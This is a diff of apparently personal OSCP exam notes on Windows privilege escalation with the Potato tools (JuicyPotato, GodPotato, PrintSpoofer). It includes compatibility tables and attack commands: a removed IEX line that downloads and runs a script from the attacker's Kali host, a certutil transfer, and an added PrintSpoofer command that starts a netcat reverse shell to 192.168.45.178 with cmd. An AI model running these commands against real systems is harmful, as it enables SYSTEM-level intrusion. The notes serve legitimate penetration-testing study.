@@ -29,32 +29,13 @@ wmic os get osarchitecture
 
 Depending on the Windows version you discovered in Step 1, select your tool from the **"Potato" family**:
 
-### 1. WinPEAS (`winPEASx64.exe`)
-
-When you run WinPEAS on the target host, look directly under the **`Privileges Information`** section:
-
-- It checks `whoami /priv` for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
-    
-- It cross-references the target’s Windows Build Number and explicitly suggests the optimal Potato variant (e.g., flagging _JuicyPotato_ for older builds vs. _RoguePotato_ / _GodPotato_ for Windows 10 1809+ / Server 2019+).
-    
-
-DOS
-
 ```
-winPEASx64.exe quiet cmd privileges
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
 ```
 
-### 2. PrivescCheck (`PrivescCheck.ps1`)
-
-If you prefer a PowerShell-native option that doesn't drop binary files to disk, **PrivescCheck** analyzes the OS version, kernel build, and service pack level alongside user privileges.
-
-PowerShell
-
 ```
-powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/PrivescCheck.ps1'); Invoke-PrivescCheck"
+reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
 ```
-
-In the output under **`Tokens / Privileges`**, it flags if `SeImpersonate` is enabled and prints the matching Potato tool family for that specific build.
 
 ### Quick Rule of Thumb (Manual Check)
 
@@ -70,6 +51,22 @@ Microsoft Windows [Version 10.0.10586]
 - **Build $< 17763$** (Before Win 10 1809 / Server 2019) $\rightarrow$ **JuicyPotato.exe**
     
 - **Build $\ge 17763$** (Win 10 1809+, Server 2019/2022) $\rightarrow$ **GodPotato.exe** or **RoguePotato.exe**
+
+| Potato        | General Windows compatibility                              | Important conditions                                                      |
+| ------------- | ---------------------------------------------------------- | ------------------------------------------------------------------------- |
+| JuicyPotato   | Windows Server 2008–2016; Windows 10 up to 1803            | DCOM/COM impersonation; vulnerable configurations and suitable CLSID      |
+| RoguePotato   | Windows Server 2019 / Windows 10 1809+                     | Requires an OXID resolver setup                                           |
+| PrintSpoofer  | Windows Server 2016 / 2019; Windows 10                     | Requires `SeImpersonatePrivilege` and accessible Print Spooler            |
+| GodPotato     | Windows Server 2012–2022; Windows 8–11                     | Compatibility depends on build and patch level                            |
+| JuicyPotatoNG | Modern Windows versions, including Server 2016-era systems | Different implementation from classic JuicyPotato; check its requirements |
+
+| Rank | Potato        | Reliability assessment                                                                                 |
+| ---- | ------------- | ------------------------------------------------------------------------------------------------------ |
+| 1    | PrintSpoofer  | Very reliable when its OS and Print Spooler prerequisites are met                                      |
+| 2    | GodPotato     | Broad compatibility; often a strong first choice on newer Windows                                      |
+| 3    | JuicyPotato   | Can be very reliable on compatible older systems, but CLSID and DCOM requirements make it more finicky |
+| 4    | JuicyPotatoNG | Useful alternative, but don't assume it fixes every classic JuicyPotato failure                        |
+| 5    | RoguePotato   | More environmental dependencies, particularly its OXID resolver setup                                  |
 
 ---
 ## GodPotato.exe
@@ -165,8 +162,17 @@ dv.paragraph("```bash\n" + command + "\n```");
 ---
 ## Printspoofer.exe
 
+Condition, PrintSpooler must be running.
+
 ```
-cd ~/Desktop/Tools/Potatoes &&
+sc.exe query Spooler
+```
+
+### Method 1 : Spawn a SYSTEM process and interact with it
+#### Transfer exe 
+
+```
+cd ~/Desktop/Tools/Potatoes && python -m http.server 80
 ```
 
 (x86) 32 bit
@@ -175,17 +181,13 @@ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32
 ```
 
  (x64) 64 bit
-```
-wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
-```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-Transfer onto target
+const command = `certutil -urlcache -split -f http://${KaliIP}/PrintSpoofer64.exe PrintSpoofer64.exe`;
 
+dv.paragraph("```bash\n" + command + "\n```");
 ```
-cd ~/Desktop/Tools/Potatoes && python3 -m http.server 80
-```
-
-On WINDOWS target
 
 POWERSHELL
 ```dataviewjs
@@ -206,6 +208,20 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
 ```
+
+### Method 1 : Trigger netcat and get RCE
+
+.\PrintSpoofer64.exe -c "C:\Users\charlotte\Desktop\nc64.exe 192.168.45.178 135 -e cmd"
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `.\\\PrintSpoofer64.exe -c "C:\\\Users\\\charlotte\\\Desktop\\\\nc64.exe ${KaliIP} 135 -e cmd"`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+
 ---
 
 ### Option B: Legacy Windows (Windows 7/8, Server 2008/2012)
@@ -260,6 +276,14 @@ C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
     
 
 ### If using GodPotato / JuicyPotato:
+
+| Windows version | Base build | JuicyPotato          |
+| --------------- | ---------- | -------------------- |
+| Server 2012     | 9200       | Generally compatible |
+| Server 2012 R2  | 9600       | Generally compatible |
+| Server 2016     | 14393      | Generally compatible |
+| Server 2019     | 17763      | Not compatible       |
+| Server 2022     | 20348      | Not compatible       |
 
 If you are using a variation that requires triggering a reverse shell back to you, generate an unencoded payload or executable using `msfvenom` or a simple PowerShell one-liner, start a second Netcat listener on Kali, and run:
 
